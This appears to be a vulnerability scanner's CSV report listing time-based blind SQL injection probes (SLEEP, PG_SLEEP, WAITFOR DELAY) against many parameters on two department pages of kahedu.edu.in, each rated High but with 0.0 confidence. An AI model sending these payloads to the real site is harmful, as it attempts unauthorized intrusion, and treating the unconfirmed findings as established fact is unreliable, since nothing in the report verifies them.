Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1%27+AND+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1%27+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=1+OR+SLEEP%285%29#1766378363869-9633061a-4de9),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1766378363869-9633061a-4de9),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=1%27+AND+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1766378363869-9633061a-4de9),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?id=SLEEP%285%29%23#1766378363869-9633061a-4de9),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?search=SLEEP%285%29%23#1766378363869-9633061a-4de9),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?q=1%22+AND+SLEEP%285%29--#1766378363869-9633061a-4de9),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1766378363869-9633061a-4de9),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/arts-science-and-humanities/department-of-information-technology/?query=SLEEP%285%29%23#1766378363869-9633061a-4de9),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=SLEEP%285%29%23#1574016421198-a00647ae-15e3),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1+OR+SLEEP%285%29#1574016421198-a00647ae-15e3),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27+AND+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=SLEEP%285%29%23#1574016421198-a00647ae-15e3),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=SLEEP%285%29%23#1574016421198-a00647ae-15e3),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1+OR+SLEEP%285%29#1574016421198-a00647ae-15e3),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=SLEEP%285%29%23#1574016421198-a00647ae-15e3),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1+OR+SLEEP%285%29#1574016421198-a00647ae-15e3),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=SLEEP%285%29%23#1574016421198-a00647ae-15e3),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=SLEEP%285%29%23#1574016421198-a00647ae-15e3),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1+OR+SLEEP%285%29#1574016421198-a00647ae-15e3),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27+AND+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=SLEEP%285%29%23#1574016421198-a00647ae-15e3),SLEEP(5)#,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%22+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421198-a00647ae-15e3),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%22+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%22+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%22+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1+OR+SLEEP%285%29#1574016421198-a00647ae-15e3),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%22+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421198-a00647ae-15e3),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%22+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=1%27+AND+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%27+AND+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421198-a00647ae-15e3),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421198-a00647ae-15e3),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1+OR+SLEEP%285%29#1574016421198-a00647ae-15e3),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1%27%3B+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1'; WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=1%27+AND+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421198-a00647ae-15e3),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27+AND+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: id (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?id=1+OR+SLEEP%285%29#1574016421198-a00647ae-15e3),1 OR SLEEP(5),Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=1%27%3B+SELECT+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1'; SELECT PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: query (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?query=1%27+AND+PG_SLEEP%285%29--#1574016421198-a00647ae-15e3),1' AND PG_SLEEP(5)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: q (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?q=%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),';WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: page (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?page=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421198-a00647ae-15e3),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: cmd (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?cmd=1%27+WAITFOR+DELAY+%270%3A0%3A5%27--#1574016421198-a00647ae-15e3),1' WAITFOR DELAY '0:0:5'--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: search (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?search=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29a%29--#1574016421198-a00647ae-15e3),' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--,Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
Blind SQL Injection (Time-Based),High,0.0,Parameter: file (URL: https://kahedu.edu.in/academics/engineering/department-of-artificial-intelligence-and-data-science/?file=1%22+AND+SLEEP%285%29--#1574016421198-a00647ae-15e3),"1"" AND SLEEP(5)--",Attacker can exfiltrate data byte-by-byte.,Use parameterized queries to prevent all forms of SQLi.
